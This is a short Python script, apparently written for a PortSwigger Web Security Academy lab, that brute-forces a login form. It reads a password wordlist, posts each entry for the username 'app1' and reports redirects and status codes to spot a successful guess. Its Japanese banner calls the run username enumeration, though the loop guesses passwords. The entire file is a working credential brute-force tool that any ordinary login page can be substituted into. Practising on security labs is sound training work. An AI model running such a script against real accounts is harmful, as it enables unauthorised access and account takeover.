import requests

URL = "https://0ac6006a032ad961806a85a700f6008d.web-security-academy.net/login"

with open("pw.txt", "r") as f:
    pws = f.read().splitlines()

print("[*] ユーザー名の列挙（Enumeration）を開始します！")



for pw in pws:
    data = {
        "username": "app1",
        "password": pw
    }

    # リダイレクト有無を判定するため、POST後に自動追従しない
    response = requests.post(URL, data=data, allow_redirects=False, timeout=10)

    is_redirect = response.is_redirect or response.is_permanent_redirect
    location = response.headers.get("Location", "-")

    print(
        f"password: {pw:15} | redirect: {is_redirect!s:5} "
        f"| status: {response.status_code} | location: {location}"
    )